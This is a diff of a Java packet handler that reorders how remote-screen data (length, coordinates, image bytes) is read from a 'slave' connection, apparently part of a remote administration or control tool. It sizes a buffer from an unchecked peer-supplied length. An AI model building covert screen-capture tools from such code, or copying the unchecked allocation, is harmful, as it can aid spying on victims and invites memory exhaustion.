@@ -39,6 +39,14 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 
 		int mouseX = slave.readInt();
 		int mouseY = slave.readInt();
+		
+		int blen = slave.readInt();
+
+		int x = slave.readInt();
+		int y = slave.readInt();
+		
+		byte[] buffer = new byte[blen];
+		slave.getDataInputStream().readFully(buffer);
 
 		RemoteScreenData itd = instances.get(slave);
 
@@ -70,15 +78,11 @@ public class Packet17RemoteScreen extends AbstractIncomingPacket {
 				//if (slave.readBoolean()) {
 					itd.setUpdatedChunks(itd.getUpdatedChunks() + 1);
 
-					int blen = slave.readInt();
-
-					int x = slave.readInt();
-					int y = slave.readInt();
+					
 					
 					System.out.println(x + ", " + y);
 
-					byte[] buffer = new byte[blen];
-					slave.getDataInputStream().readFully(buffer);
+					
 
 					// buffer = Crypto.decrypt(GZip.decompress(buffer),
 					// slave.getConnection().getKey());
